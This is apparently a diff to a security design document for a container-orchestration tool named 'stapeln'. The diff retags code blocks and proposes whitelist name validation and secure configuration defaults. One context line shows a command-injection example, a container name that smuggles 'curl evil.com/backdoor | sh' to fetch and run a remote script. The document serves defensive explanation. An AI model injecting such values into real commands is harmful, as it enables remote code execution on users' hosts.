@@ -276,7 +276,7 @@ stapeln: "Extend for another minute?"
 ### The Problem
 
 **Current code** (Model.res):
-```rescript
+```affinescript
 type component = {
   id: string,
   componentType: componentType,
@@ -308,7 +308,7 @@ docker run --name "nginx; curl evil.com/backdoor | sh" ...
 ### The Fix: Strict Validation
 
 **Whitelist-only validation**:
-```rescript
+```affinescript
 // Only allow alphanumeric + dash + underscore
 let isValidComponentName = (name: string): bool => {
   Js.Re.test_(%re("/^[a-zA-Z0-9_-]+$/"), name)
@@ -353,7 +353,7 @@ end
 ### The Problem
 
 **Current defaults** (Settings.res):
-```rescript
+```affinescript
 type settings = {
   defaultRuntime: Podman,  // ✅ Good
   autoVerifySignatures: bool,  // ⚠️  What's the default?
@@ -364,7 +364,7 @@ type settings = {
 ```
 
 **If defaults are**:
-```rescript
+```affinescript
 {
   autoVerifySignatures: false,  // ❌ BAD
   requireSBOM: false,  // ❌ BAD
@@ -377,7 +377,7 @@ type settings = {
 
 ### The Fix: Secure Defaults
 
-```rescript
+```affinescript
 // settings/defaults.res
 // SPDX-License-Identifier: CC-BY-SA-4.0
 
@@ -512,7 +512,7 @@ You: "🎯"
 6. Ephemeral pinhole limits
 
 ### Priority 2: Configuration UI (4 weeks)
-7. stapeln frontend (ReScript)
+7. stapeln frontend (affinescript)
 8. Game-like interface
 9. Attack surface analyzer
 10. Simulation mode
